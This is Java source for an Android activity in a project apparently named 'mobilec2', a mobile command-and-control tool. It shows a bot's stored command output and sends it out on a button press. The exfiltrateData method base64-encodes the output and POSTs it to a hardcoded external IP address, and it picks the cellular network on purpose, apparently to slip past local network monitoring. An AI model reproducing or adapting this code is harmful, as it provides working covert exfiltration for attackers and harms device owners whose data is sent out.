package c2.mobile.mobilec2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class DisplayOutput extends AppCompatActivity {

    final String urlString = "http://129.21.62.13:5000/out";

    /*
    Turns hashmap of string keys and values into URL-encoded string
     Credit to https://stackoverflow.com/questions/2938502/sending-post-data-in-android
     */
    private String getPostDataString(HashMap<String, String> params) throws UnsupportedEncodingException {
        StringBuilder result = new StringBuilder();
        boolean first = true;
        for(Map.Entry<String, String> entry : params.entrySet()){
            if (first)
                first = false;
            else
                result.append("&");
            result.append(URLEncoder.encode(entry.getKey(), "UTF-8"));
            result.append("=");
            result.append(URLEncoder.encode(entry.getValue(), "UTF-8"));
        }
        return result.toString();
    }


    /*
        Makes HTTP POST request to server at URLString using the specified network + POST parameters
        Returns true if successfully completes, false if it errors out
     */
    private boolean makeRequest(Network network, String urlString, HashMap<String, String> postDataParams){
        try {
            URL url = new URL(urlString);
            String stringData = getPostDataString(postDataParams);
            HttpURLConnection conn = (HttpURLConnection)network.openConnection(url);
            conn.setFixedLengthStreamingMode(stringData.length());
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(15000);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
            writer.write(stringData);
            Log.e("Data: ", stringData);
            writer.flush();
            writer.close();
            os.close();
            os.close();
            conn.disconnect();
            return true;

        } catch (UnsupportedEncodingException e) {
            return false;
        } catch (ProtocolException e) {
            return false;
        } catch (IOException e) {
            return false;
        }
    }


    /*
        returns the last network with cellular data enabled, or null otherwise
     */
    private Network getCellularNetwork(){
        Network n = null;
        Context context = getApplicationContext();
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        Network[] networks = connectivityManager.getAllNetworks();

        for(Network network: networks){
            NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(network);
            boolean hasCellular =  capabilities != null &&
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR);

            Log.e("Net", network.toString());
            Log.e("\t", Boolean.toString(hasCellular));
            if(hasCellular) {
                n = network;
            }
        }
        return n;
    }


    /*
        attempts to exfiltrate data over cellular network
        base64 encodes data string then makes HTTP request
     */
    public void exfiltrateData(String uuid, String data){
        Network n = getCellularNetwork();
        if(n == null)
            Log.e("C2", "Could not obtain cellular network");
            //Toast.makeText(getApplicationContext(), "Could not obtain cellular network", Toast.LENGTH_LONG);
        else {
            HashMap<String, String> postDataParams = new HashMap<String, String>();
            postDataParams.put("uuid", uuid);
            String encoded = Base64.getEncoder().encodeToString(data.getBytes(StandardCharsets.UTF_8));
            postDataParams.put("data", encoded);
            if (!makeRequest(n, urlString, postDataParams))
                Log.e("C2", "HTTP request failed");
            //Toast.makeText(getApplicationContext(), "HTTP request failed", Toast.LENGTH_LONG);
        }
    }


    /*
        Handles button press for exfiltrating data
        Gets UUID and Output from textviews
        New thread must be created because android doesn't like networking/GUI on same thread
     */
    public void exfil(View v){
        TextView uuidDisplay = (TextView) findViewById(R.id.uuidDisplay);
        TextView outputTextView = (TextView) findViewById(R.id.outputTextView);
        String uuid = uuidDisplay.getText().toString();
        String outputText = outputTextView.getText().toString();
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try  {
                    Log.e("TST", "calling tst");
                    exfiltrateData(uuid, outputText);
                    Log.e("TST", "Ending tst");
                } catch (Exception e) {
                    Log.e("TST", "crashed tst");
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // 🌭
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_output);
        TextView uuidDisplay = (TextView) findViewById(R.id.uuidDisplay);
        TextView outputTextView = (TextView) findViewById(R.id.outputTextView);

        uuidDisplay.setAutoSizeTextTypeWithDefaults(TextView.AUTO_SIZE_TEXT_TYPE_UNIFORM);

        Intent intent = getIntent();
        String uuid = intent.getStringExtra("uuid");
        CommandDatabase commandDatabase = new CommandDatabase(getApplicationContext());
        ArrayList<String> outputList = commandDatabase.getFromDatabase(uuid, BotEntryContract.BotEntry.output);

        if(outputList.size() > 0){
            String output = outputList.get(0);
            uuidDisplay.setText(uuid);
            outputTextView.setText(output);
        }
        else {
            String blah = "testing";
            uuidDisplay.setText(uuid);
            outputTextView.setText(blah);
        }
    }
}